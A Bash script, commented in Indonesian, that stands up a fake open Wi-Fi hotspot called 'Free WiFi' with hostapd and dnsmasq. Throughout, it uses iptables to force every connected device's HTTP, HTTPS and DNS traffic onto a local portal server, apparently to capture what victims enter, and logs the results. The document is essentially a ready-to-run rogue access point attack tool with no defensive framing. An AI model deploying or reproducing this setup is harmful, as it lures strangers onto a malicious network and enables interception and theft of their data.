#!/bin/bash
# run.sh - Fake WiFi dengan hostapd + auto cleanup

set -e

# ========== KONFIGURASI ==========
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INTERFACE="wlan0"           # Ganti sesuai interface WiFi kamu
SSID="Free WiFi"
PASSWORD=""                 # Kosong = tanpa password
CHANNEL="6"
GATEWAY="10.0.0.1"
NETMASK="255.255.255.0"
DHCP_START="10.0.0.2"
DHCP_END="10.0.0.100"
WEB_PORT="8080"
# =================================

echo "╔═══════════════════════════════════════════╗"
echo "║     🌐 Fake WiFi AP - Auto Setup         ║"
echo "╚═══════════════════════════════════════════╝"
echo "[+] Interface : $INTERFACE"
echo "[+] SSID      : $SSID"
echo "[+] Channel   : $CHANNEL"
echo "[+] Gateway   : $GATEWAY"

# ========== FUNGSI CLEANUP ==========
cleanup() {
    echo ""
    echo "[!] STOPPING... Melakukan cleanup total..."

    # Matikan hostapd
    sudo killall hostapd 2>/dev/null || true
    sudo killall dnsmasq 2>/dev/null || true

    # Hapus aturan iptables
    sudo iptables -t nat -F 2>/dev/null || true
    sudo iptables -t nat -X 2>/dev/null || true
    sudo iptables -F 2>/dev/null || true

    # Matikan interface monitor
    sudo airmon-ng stop ${INTERFACE}mon 2>/dev/null || true

    # Reset interface
    sudo ip link set $INTERFACE down 2>/dev/null || true
    sudo ip addr flush dev $INTERFACE 2>/dev/null || true
    sudo ip link set $INTERFACE up 2>/dev/null || true

    # Restart NetworkManager (biar WiFi normal lagi)
    echo "[+] Merestart NetworkManager..."
    sudo systemctl restart NetworkManager 2>/dev/null || sudo service network-manager restart 2>/dev/null || true

    # Matikan proses Python
    sudo pkill -f fake_wifi.py 2>/dev/null || true

    echo "[✅] Cleanup selesai! Mode monitor dimatikan. NetworkManager aktif."
    exit 0
}

# Trap sinyal
trap cleanup SIGINT SIGTERM EXIT
# =====================================

# ========== CEK INTERFACE ==========
if ! ip link show $INTERFACE &>/dev/null; then
    echo "[-] Interface $INTERFACE tidak ditemukan!"
    exit 1
fi

# ========== KILL PROSES YANG MENGGANGGU ==========
echo "[+] Menghentikan proses yang menggunakan interface..."
sudo airmon-ng check kill 2>/dev/null || true
sudo systemctl stop NetworkManager 2>/dev/null || true
sudo systemctl stop wpa_supplicant 2>/dev/null || true

# ========== AKTIFKAN MODE MONITOR ==========
echo "[+] Mengaktifkan mode monitor..."
sudo airmon-ng start $INTERFACE
sleep 2

# Cek nama interface monitor
if ip link show ${INTERFACE}mon &>/dev/null; then
    MON_INTERFACE="${INTERFACE}mon"
else
    MON_INTERFACE="$INTERFACE"
fi
echo "[+] Monitor interface: $MON_INTERFACE"

# ========== SET IP ADDRESS ==========
echo "[+] Mengatur IP address..."
sudo ip link set $MON_INTERFACE down 2>/dev/null || true
sudo ip addr flush dev $MON_INTERFACE 2>/dev/null || true
sudo ip link set $MON_INTERFACE up 2>/dev/null || true
sudo ip addr add $GATEWAY/24 dev $MON_INTERFACE 2>/dev/null || true

# ========== BUAT KONFIGURASI HOSTAPD ==========
echo "[+] Membuat konfigurasi hostapd..."
cat > "$SCRIPT_DIR/hostapd.conf" <<EOF
interface=$MON_INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Kalau ada password
if [ -n "$PASSWORD" ]; then
    echo "wpa=2" >> "$SCRIPT_DIR/hostapd.conf"
    echo "wpa_passphrase=$PASSWORD" >> "$SCRIPT_DIR/hostapd.conf"
    echo "wpa_key_mgmt=WPA-PSK" >> "$SCRIPT_DIR/hostapd.conf"
    echo "rsn_pairwise=CCMP" >> "$SCRIPT_DIR/hostapd.conf"
fi

# ========== BUAT KONFIGURASI DNSMASQ ==========
echo "[+] Membuat konfigurasi dnsmasq..."
cat > "$SCRIPT_DIR/dnsmasq.conf" <<EOF
interface=$MON_INTERFACE
dhcp-range=$DHCP_START,$DHCP_END,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
no-resolv
port=0
log-queries
EOF

# ========== JALANKAN DNSMASQ ==========
echo "[+] Menjalankan DHCP server (dnsmasq)..."
sudo dnsmasq -C "$SCRIPT_DIR/dnsmasq.conf" --pid-file=/tmp/dnsmasq.pid

# ========== AKTIFKAN IP FORWARDING ==========
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# ========== SET IPTABLES ==========
echo "[+] Mengatur iptables..."
sudo iptables -t nat -F
sudo iptables -F

# Redirect HTTP ke web server lokal
sudo iptables -t nat -A PREROUTING -i $MON_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $GATEWAY:$WEB_PORT
sudo iptables -t nat -A PREROUTING -i $MON_INTERFACE -p tcp --dport 443 -j DNAT --to-destination $GATEWAY:$WEB_PORT

# Redirect DNS ke lokal (biar ga bisa resolve)
sudo iptables -t nat -A PREROUTING -i $MON_INTERFACE -p udp --dport 53 -j DNAT --to-destination $GATEWAY

# Forward traffic
sudo iptables -A FORWARD -i $MON_INTERFACE -j ACCEPT
sudo iptables -A FORWARD -o $MON_INTERFACE -j ACCEPT

# Kalau ada internet (opsional)
# sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# ========== JALANKAN HOSTAPD (AP) ==========
echo "[+] Menjalankan Access Point '$SSID'..."
echo "    (tanpa password)" 
sudo hostapd "$SCRIPT_DIR/hostapd.conf" -B 2>/dev/null || {
    echo "[-] Gagal menjalankan hostapd. Coba install: sudo apt install hostapd"
    cleanup
    exit 1
}

# ========== JALANKAN WEB SERVER ==========
echo "[+] Menjalankan web server di port $WEB_PORT..."
cd "$SCRIPT_DIR"
sudo python3 fake_wifi.py &
WEB_PID=$!

echo ""
echo "╔═══════════════════════════════════════════╗"
echo "║  ✅ FAKE WIFI AKTIF!                     ║"
echo "║  SSID    : $SSID                         ║"
echo "║  Password: (kosong)                      ║"
echo "║  IP      : $GATEWAY                      ║"
echo "║  Log     : $SCRIPT_DIR/logs/logs.txt    ║"
echo "╚═══════════════════════════════════════════╝"
echo ""
echo "📱 Connect ke '$SSID' dari HP/Laptop"
echo "🔄 Akan redirect ke halaman portal"
echo ""
echo "[!] Ketik 'stop' atau tekan Ctrl+C untuk berhenti"

# ========== LOOP DETEKSI PERINTAH 'STOP' ==========
while true; do
    read -t 1 input 2>/dev/null || true
    if [[ "$input" == "stop" ]]; then
        echo "[!] Perintah stop diterima."
        cleanup
        break
    fi
done